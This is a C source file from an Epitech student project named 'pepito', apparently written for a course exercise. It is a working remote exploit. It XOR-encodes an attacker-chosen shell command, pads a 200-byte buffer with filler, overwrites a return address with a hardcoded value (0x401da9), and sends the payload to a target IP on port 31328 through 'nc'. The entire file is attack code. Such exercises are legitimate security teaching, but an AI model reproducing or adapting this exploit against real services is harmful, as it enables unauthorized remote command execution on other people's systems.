/*
** main.c for exploit in /home/tessie_g//afs/rendu/projets/pepito_de_base/source/exploit
** 
** Made by adrian tessier
** Login   <tessie_g@epitech.net>
** 
** Started on  Fri Apr  6 21:11:07 2012 adrian tessier
** Last update Sun Apr  8 19:33:33 2012 adrian tessier
*/

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "lib/my.h"

char    *add_str_in_str(char *src, char *src2);
void    my_put_location_in_cmd(int *i, int location, char *str);
#define	LEN_CMD		200

void	my_put_cmd_in_file(char *tmp)
{
  int	fd;
  int	i = -1;

  if ((fd = open("tmp.exploit", O_CREAT | O_TRUNC | O_WRONLY,
                 S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)) == -1)
    {
      my_putstr_error("Open failed.\n");
      return ;
    }
  while (++i < LEN_CMD - 1)
    write(fd, &tmp[i], 1);
  if (close(fd) == -1)
    return ;
  return ;
}

char	*my_put_cmd_in_script(char *src, char *src2)
{
  int	i = -1;
  int	i2 = -1;
  char	*dest;

  if (src2 == NULL)
    return (src);
  if (src == NULL)
    return (NULL);
  dest = my_xmalloc(my_strlen(src) + my_strlen(src2) + 1);
  while (src[++i])
    dest[++i2] = src[i];
  i = -1;
  while (src2[++i])
    dest[++i2] = src2[i] ^ 85;
  dest[++i2] = '\0' ^ 85;
  my_putstr(dest);
  return (dest);
}

char	*func_exploit(char *cmd)
{
  int	i;
  char	*tmp;
  char	*dest;

  if ((tmp = add_str_in_str("1 ", my_int_to_char(LEN_CMD))) == NULL)
    return (NULL);
  if ((dest = my_put_cmd_in_script(tmp, cmd)) == NULL)
    return (NULL);
  free(tmp);
  i = my_strlen(dest) - 1;
  tmp = my_xmalloc(LEN_CMD);
  tmp[0] = '\0';
  tmp[LEN_CMD - 1] = '\0';
  strcat(tmp, dest);
  while (++i < LEN_CMD - 1)
    if (i == 125)
      my_put_location_in_cmd(&i, 0x401da9, tmp);
    else
      tmp[i] = 'A';
  free(dest);
  my_put_cmd_in_file(tmp);
  return (tmp);
}

void	my_exploit(char *cmd_pep, char *ip)
{
  char	*cmd;
  char	*tmp;

  if (!cmd_pep || !ip || my_strlen(cmd_pep) > 115 || my_strlen(cmd_pep) < 1)
    return ;
  if ((cmd =  func_exploit(cmd_pep)) == NULL)
    return ;
  free(cmd);
  cmd = "cat tmp.exploit | nc ";
  if ((tmp = add_str_in_str(cmd, ip)) == NULL)
    return ;
  if ((cmd = add_str_in_str(tmp, " 31328")) == NULL)
    {
      free(tmp);
      return ;
    }
  free(tmp);
  if (system(cmd) == -1)
    my_putstr_error("System Failed\n");
  free(cmd);
  sleep(2);
  remove("tmp.exploit");
}

int	main(int argc, char **argv)
{
  if (argc == 3)
    my_exploit(argv[1], argv[2]);
  else if (argc == 4)
    my_exploit(argv[1], argv[2]);
  return (0);
}
